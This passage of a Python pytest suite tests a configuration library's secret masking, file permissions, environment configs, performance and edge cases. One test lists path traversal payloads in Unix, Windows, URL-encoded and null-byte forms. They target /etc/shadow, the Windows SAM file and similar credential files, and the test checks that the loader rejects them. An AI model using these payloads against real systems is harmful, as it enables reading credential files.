                    # Additional representations if available
                    try:
                        representations.append(config.__dict__ if hasattr(config, '__dict__') else {})
                        representations.append(vars(config) if hasattr(config, '__dict__') else {})
                    except:
                        pass
                    
                    for representation in representations:
                        representation_str = str(representation)
                        
                        # Secret should not appear in plain text
                        assert secret_value not in representation_str, f"Secret value '{secret_value}' exposed in {field_name}"
                        
                        # Should contain masking indicators
                        masking_indicators = ['*', '[REDACTED]', '[HIDDEN]', '[MASKED]', '***', '•••']
                        has_masking = any(indicator in representation_str for indicator in masking_indicators)
                        
                        if field_name in representation_str:
                            assert has_masking, f"Field '{field_name}' not properly masked in representation"
                            
                except (ValueError, ConfigError):
                    # Config creation might fail for test cases
                    pass
    
    def test_config_file_permission_validation(self):
        """Test validation of configuration file permissions."""
        if load_config:
            import stat
            
            test_config = {'api_key': 'permission_test_key'}
            
            # Test different permission scenarios
            permission_tests = [
                (stat.S_IRUSR, True),  # Owner read-only (secure)
                (stat.S_IRUSR | stat.S_IWUSR, True),  # Owner read-write (acceptable)
                (stat.S_IRUSR | stat.S_IRGRP, False),  # Group readable (potentially insecure)
                (stat.S_IRUSR | stat.S_IRGRP | stat.S_IROTH, False),  # World readable (insecure)
                (stat.S_IRUSR | stat.S_IWUSR | stat.S_IWGRP | stat.S_IWOTH, False),  # World writable (very insecure)
            ]
            
            for permissions, should_be_secure in permission_tests:
                with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
                    json.dump(test_config, f)
                    temp_path = f.name
                
                try:
                    # Set specific permissions
                    os.chmod(temp_path, permissions)
                    
                    if should_be_secure:
                        # Should load without security warnings
                        config = load_config(temp_path)
                        assert config is not None
                    else:
                        # Security-conscious implementations might reject insecure files
                        try:
                            config = load_config(temp_path)
                            # If it loads, at least verify it contains expected data
                            assert config.get('api_key') == 'permission_test_key'
                        except (PermissionError, ConfigError):
                            # Expected for security-conscious implementations
                            pass
                            
                finally:
                    os.unlink(temp_path)
    
    def test_config_path_traversal_comprehensive(self):
        """Test comprehensive path traversal attack prevention."""
        if load_config:
            path_traversal_attempts = [
                # Unix-style path traversal
                '../../../etc/passwd',
                '../../../../etc/shadow', 
                '../../../etc/hosts',
                '../../../../../../etc/passwd',
                
                # Windows-style path traversal
                '..\\..\\..\\windows\\system32\\config\\sam',
                '..\\..\\..\\..\\boot.ini',
                '..\\..\\..\\windows\\win.ini',
                
                # Mixed separators
                '..\\../../../etc/passwd',
                '../..\\..\\etc/passwd',
                
                # URL encoded
                '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
                '..%2f..%2f..%2fetc%2fpasswd',
                
                # Double encoded
                '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
                
                # Null byte injection
                '../../../etc/passwd\x00.json',
                '../../etc/passwd%00.json',
                
                # Absolute paths to sensitive locations
                '/etc/passwd',
                '/etc/shadow',
                '/proc/version',
                'C:\\Windows\\System32\\config\\SAM',
                'C:\\boot.ini',
                '/var/log/auth.log',
            ]
            
            for malicious_path in path_traversal_attempts:
                try:
                    with pytest.raises((FileNotFoundError, PermissionError, ValueError, ConfigError, OSError)):
                        load_config(malicious_path)
                except Exception as e:
                    # Any other exception is also acceptable as long as it doesn't succeed
                    assert not isinstance(e, AssertionError), f"Path traversal attempt succeeded: {malicious_path}"


class TestConfigComplexRealWorldScenarios:
    """Tests for complex real-world configuration scenarios."""
    
    def setup_method(self):
        """Set up test fixtures."""
        self.base_config = {
            'api_key': 'test_key_123',
            'base_url': 'https://api.example.com',
            'timeout': 30,
            'max_retries': 3,
            'debug': False
        }
    
    def test_config_multi_environment_management(self):
        """Test configuration management across multiple environments."""
        if Config:
            environments = {
                'development': {
                    **self.base_config,
                    'api_key': 'dev_key_123',
                    'base_url': 'https://dev-api.example.com',
                    'debug': True,
                    'log_level': 'debug',
                    'ssl_verify': False
                },
                'testing': {
                    **self.base_config,
                    'api_key': 'test_key_456',
                    'base_url': 'https://test-api.example.com',
                    'debug': True,
                    'log_level': 'info',
                    'ssl_verify': True,
                    'mock_external_services': True
                },
                'staging': {
                    **self.base_config,
                    'api_key': 'staging_key_789',
                    'base_url': 'https://staging-api.example.com',
                    'debug': False,
                    'log_level': 'warn',
                    'ssl_verify': True,
                    'rate_limit': 1000
                },
                'production': {
                    **self.base_config,
                    'api_key': 'prod_key_xyz',
                    'base_url': 'https://api.example.com',
                    'debug': False,
                    'log_level': 'error',
                    'ssl_verify': True,
                    'rate_limit': 5000,
                    'monitoring_enabled': True
                }
            }
            
            for env_name, env_config in environments.items():
                try:
                    config = Config(env_config)
                    assert config is not None
                    
                    # Verify environment-specific settings
                    if env_name == 'production':
                        # Production should have stricter settings
                        assert env_config.get('debug') is False
                        assert env_config.get('ssl_verify') is True
                    elif env_name == 'development':
                        # Development might have relaxed settings
                        assert env_config.get('debug') is True
                        
                except (ValueError, ConfigError):
                    pytest.fail(f"Failed to create config for {env_name} environment")
    
    def test_config_feature_flag_management(self):
        """Test configuration with feature flags and toggles."""
        if Config:
            feature_flag_config = {
                **self.base_config,
                'features': {
                    'new_ui': {
                        'enabled': True,
                        'rollout_percentage': 50,
                        'user_groups': ['beta_testers', 'internal']
                    },
                    'advanced_analytics': {
                        'enabled': False,
                        'rollout_percentage': 0,
                        'dependencies': ['new_ui']
                    },
                    'experimental_algorithm': {
                        'enabled': True,
                        'rollout_percentage': 10,
                        'a_b_test_group': 'control'
                    },
                    'legacy_compatibility': {
                        'enabled': True,
                        'deprecation_date': '2024-12-31',
                        'migration_guide_url': 'https://docs.example.com/migration'
                    }
                }
            }
            
            try:
                config = Config(feature_flag_config)
                assert config is not None
                
                # Verify feature flag structure is preserved
                if hasattr(config, 'features') or 'features' in config:
                    # Feature flags should be accessible
                    pass
                    
            except (ValueError, ConfigError):
                # Feature flag structure might not be supported
                pass
    
    def test_config_microservice_coordination(self):
        """Test configuration for microservice coordination."""
        if Config:
            microservice_config = {
                **self.base_config,
                'services': {
                    'user_service': {
                        'url': 'https://user-service.internal',
                        'timeout': 5,
                        'circuit_breaker': {
                            'failure_threshold': 5,
                            'recovery_timeout': 30
                        }
                    },
                    'auth_service': {
                        'url': 'https://auth-service.internal',
                        'timeout': 3,
                        'retry_policy': {
                            'max_attempts': 3,
                            'backoff_factor': 2
                        }
                    },
                    'notification_service': {
                        'url': 'https://notification-service.internal',
                        'timeout': 10,
                        'async': True,
                        'queue_config': {
                            'max_queue_size': 1000,
                            'batch_size': 50
                        }
                    }
                },
                'service_discovery': {
                    'enabled': True,
                    'registry_url': 'https://consul.internal:8500',
                    'health_check_interval': 30
                },
                'tracing': {
                    'enabled': True,
                    'jaeger_endpoint': 'https://jaeger.internal:14268',
                    'sampling_rate': 0.1
                }
            }
            
            try:
                config = Config(microservice_config)
                assert config is not None
                
                # Verify complex nested structure is handled
                if hasattr(config, 'services') or 'services' in config:
                    # Service configuration should be preserved
                    pass
                    
            except (ValueError, ConfigError):
                # Complex microservice config might not be supported
                pass
    
    def test_config_disaster_recovery_settings(self):
        """Test configuration for disaster recovery scenarios."""
        if Config:
            dr_config = {
                **self.base_config,
                'disaster_recovery': {
                    'backup_strategy': {
                        'primary_backup': {
                            'location': 'https://backup-primary.example.com',
                            'encryption_key': 'backup_encryption_key',
                            'retention_days': 30
                        },
                        'secondary_backup': {
                            'location': 'https://backup-secondary.example.com',
                            'encryption_key': 'backup_encryption_key_2',
                            'retention_days': 90
                        }
                    },
                    'failover': {
                        'primary_region': 'us-east-1',
                        'failover_regions': ['us-west-2', 'eu-west-1'],
                        'auto_failover_enabled': True,
                        'health_check_interval': 60,
                        'failure_threshold': 3
                    },
                    'data_replication': {
                        'real_time_sync': True,
                        'sync_endpoints': [
                            'https://replica-1.example.com',
                            'https://replica-2.example.com'
                        ],
                        'consistency_level': 'strong'
                    }
                }
            }
            
            try:
                config = Config(dr_config)
                assert config is not None
                
                # Verify disaster recovery configuration is preserved
                if hasattr(config, 'disaster_recovery') or 'disaster_recovery' in config:
                    # DR settings should be accessible
                    pass
                    
            except (ValueError, ConfigError):
                # DR configuration might not be supported
                pass


class TestConfigPerformanceStress:
    """Comprehensive performance and stress tests for configuration handling."""
    
    def test_config_creation_performance_scaling(self):
        """Test configuration creation performance with increasing complexity."""
        if Config:
            import time
            
            complexity_levels = [
                (10, 'small'),
                (100, 'medium'), 
                (1000, 'large'),
                (5000, 'xlarge')
            ]
            
            performance_results = []
            
            for size, label in complexity_levels:
                # Generate configuration of specified complexity
                complex_config = {
                    'api_key': f'performance_test_key_{size}',
                    'base_url': 'https://api.example.com',
                    'timeout': 30,
                    **{f'key_{i}': f'value_{i}' * 10 for i in range(size)},
                    'nested': {
                        f'nested_key_{i}': {
                            'sub_key': f'sub_value_{i}',
                            'data': list(range(min(i, 10)))
                        } for i in range(min(size // 10, 100))
                    }
                }
                
                # Measure creation time
                start_time = time.time()
                
                try:
                    config = Config(complex_config)
                    creation_time = time.time() - start_time
                    
                    assert config is not None
                    performance_results.append((size, creation_time))
                    
                    # Performance should scale reasonably
                    max_time = size * 0.00001  # 0.01ms per key maximum
                    assert creation_time < max_time, f"Config creation too slow for {label} config ({size} keys): {creation_time:.4f}s"
                    
                except (ValueError, ConfigError, MemoryError):
                    # Some configurations might be too large
                    break
            
            # Verify performance doesn't degrade exponentially
            if len(performance_results) >= 2:
                for i in range(1, len(performance_results)):
                    size_ratio = performance_results[i][0] / performance_results[i-1][0]
                    time_ratio = performance_results[i][1] / performance_results[i-1][1]
                    
                    # Time should not grow faster than size²
                    assert time_ratio < size_ratio ** 2, f"Performance degradation detected: {time_ratio} vs {size_ratio}"
    
    def test_config_memory_efficiency(self):
        """Test configuration memory efficiency and garbage collection."""
        if Config:
            import gc
            import psutil
            import os
            
            # Get initial memory usage
            process = psutil.Process(os.getpid())
            initial_memory = process.memory_info().rss
            
            # Create and destroy many configurations
            configs = []
            config_data = {
                'api_key': 'memory_test_key',
                'large_data': {f'key_{i}': 'x' * 1000 for i in range(100)}
            }
            
            try:
                # Create many config objects
                for i in range(100):
                    config = Config(config_data)
                    configs.append(config)
                
                # Measure memory after creation
                mid_memory = process.memory_info().rss
                memory_growth = mid_memory - initial_memory
                
                # Clear references and force garbage collection
                configs.clear()
                gc.collect()
                
                # Measure memory after cleanup
                final_memory = process.memory_info().rss
                memory_cleanup = mid_memory - final_memory
                
                # Verify reasonable memory usage
                assert memory_growth < 100 * 1024 * 1024, f"Excessive memory usage: {memory_growth / (1024*1024):.2f} MB"
                assert memory_cleanup > memory_growth * 0.5, f"Poor memory cleanup: {memory_cleanup / (1024*1024):.2f} MB cleaned vs {memory_growth / (1024*1024):.2f} MB used"
                
            except ImportError:
                # psutil might not be available
                pytest.skip("psutil not available for memory testing")
            except (ValueError, ConfigError):
                # Config creation might fail
                pass
    
    def test_config_concurrent_access_stress(self):
        """Test configuration under high concurrent access stress."""
        if Config:
            import threading
            import random
            import time
            
            config_data = {'api_key': 'concurrent_stress_test_key', 'counter': 0}
            config = Config(config_data)
            
            results = []
            errors = []
            access_count = 0
            
            def stress_test_worker():
                nonlocal access_count
                try:
                    for _ in range(200):  # Higher iteration count for stress
                        # Random access patterns
                        access_type = random.choice(['read', 'read', 'read', 'str', 'repr'])
                        
                        if access_type == 'read':
                            if hasattr(config, 'api_key'):
                                value = config.api_key
                            elif 'api_key' in config:
                                value = config['api_key']
                            access_count += 1
                            
                        elif access_type == 'str':
                            str_repr = str(config)
                            assert len(str_repr) > 0
                            access_count += 1
                            
                        elif access_type == 'repr':
                            repr_str = repr(config)
                            assert len(repr_str) > 0
                            access_count += 1
                        
                        # Small random delay to vary timing
                        time.sleep(random.uniform(0.0001, 0.001))
                        
                    results.append(True)
                    
                except Exception as e:
                    errors.append(e)
                    results.append(False)
            
            # Create many concurrent threads for stress testing
            threads = [threading.Thread(target=stress_test_worker) for _ in range(20)]
            
            start_time = time.time()
            
            for thread in threads:
                thread.start()
            
            for thread in threads:
                thread.join()
            
            total_time = time.time() - start_time
            
            # Verify stress test results
            success_rate = sum(results) / len(results) if results else 0
            
            assert success_rate > 0.95, f"High failure rate under stress: {success_rate:.2%}"
            assert len(errors) < len(threads) * 0.1, f"Too many errors under stress: {len(errors)}"
            assert total_time < 30, f"Stress test took too long: {total_time:.2f}s"
            assert access_count > 0, "No successful accesses recorded"


# Additional parametrized tests for comprehensive edge case coverage
@pytest.mark.parametrize("malformed_data", [
    '{"key": value}',  # Missing quotes around value
    '{"key": "value",}',  # Trailing comma  
    '{key: "value"}',  # Missing quotes around key
    '{"key": "value" "another": "value"}',  # Missing comma
    '{"key": undefined}',  # JavaScript undefined
    '{"key": NaN}',  # JavaScript NaN
    '{"key": Infinity}',  # JavaScript Infinity
    '{"key": "value"',  # Missing closing brace
    '{"key": "value"}}',  # Extra closing brace
    '{"key": "unclosed string}',  # Unclosed string
    '{"key\\": "value"}',  # Invalid escape in key
])
def test_config_malformed_json_comprehensive(malformed_data):
    """Test configuration handling of comprehensive malformed JSON inputs."""
    if not load_config:
        pytest.skip("load_config function not available")
    
    with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
        f.write(malformed_data)
        temp_path = f.name
    
    try:
        with pytest.raises((json.JSONDecodeError, ValueError, ConfigError)):
            load_config(temp_path)
    finally:
        os.unlink(temp_path)


@pytest.mark.parametrize("size,expected_max_time", [
    (1, 0.001),
    (10, 0.002), 
    (100, 0.01),
    (1000, 0.05),
    (5000, 0.2)
])
def test_config_scalability_comprehensive(size, expected_max_time):
    """Test configuration system scalability with comprehensive size variations."""
    if not Config:
        pytest.skip("Config class not available")
    
    import time
    
    # Generate configuration of specified size with realistic structure
    large_config = {
        'api_key': f'scalability_test_key_{size}',
        'base_url': 'https://api.example.com',
        'metadata': {f'meta_key_{i}': f'meta_value_{i}' for i in range(min(size // 10, 100))},
        **{f'config_key_{i}': {
            'value': f'config_value_{i}',
            'type': 'string' if i % 2 == 0 else 'number',
            'required': i % 3 == 0,
            'description': f'Configuration parameter {i}',
            'tags': [f'tag_{j}' for j in range(i % 5)]
        } for i in range(size)}
    }
    
    # Warm up
    for _ in range(3):
        try:
            Config({'api_key': 'warmup'})
        except:
            pass
    
    # Measure creation time
    start_time = time.time()
    config = Config(large_config)
    creation_time = time.time() - start_time
    
    assert config is not None
    assert creation_time < expected_max_time, f"Config creation too slow for size {size}: {creation_time:.4f}s > {expected_max_time}s"


@pytest.mark.parametrize("special_value", [
    float('inf'),
    float('-inf'),
    float('nan'),
    complex(1, 2),
    frozenset([1, 2, 3]),
    range(10),
    memoryview(b'test'),
    type,
    lambda x: x,
])
def test_config_special_python_values(special_value):
    """Test configuration handling of special Python values and types."""
    if not Config:
        pytest.skip("Config class not available")
    
    special_config = {
        'api_key': 'special_value_test',
        'special_field': special_value
    }
    
    try:
        config = Config(special_config)
        assert config is not None
        
        # Verify the special value is handled appropriately
        if hasattr(config, 'special_field'):
            stored_value = config.special_field
            # Value might be converted or preserved
            assert stored_value is not None
        elif 'special_field' in config:
            stored_value = config['special_field']
            assert stored_value is not None
            
    except (ValueError, ConfigError, TypeError):
        # Special values might not be supported
        pass


@pytest.mark.parametrize("nested_depth", [1, 2, 5, 10, 20, 50])
def test_config_deep_nesting_limits(nested_depth):
    """Test configuration with varying levels of deep nesting."""
    if not Config:
        pytest.skip("Config class not available")
    
    # Build deeply nested structure
    nested_config = {'api_key': 'deep_nesting_test'}
    current_level = nested_config
    
    for i in range(nested_depth):
        current_level[f'level_{i}'] = {
            'data': f'value_at_level_{i}',
            'index': i,
            'is_deep': i > 5
        }
        current_level = current_level[f'level_{i}']
    
    # Add final value at deepest level
    current_level['final_value'] = 'reached_maximum_depth'
    
    try:
        config = Config(nested_config)
        assert config is not None
        
        # Verify structure is preserved
        config_str = str(config)
        assert 'deep_nesting_test' in config_str
        
    except (ValueError, ConfigError, RecursionError):
        if nested_depth > 20:
            # Very deep nesting might be rejected
            pass
        else:
            pytest.fail(f"Reasonable nesting depth {nested_depth} was rejected")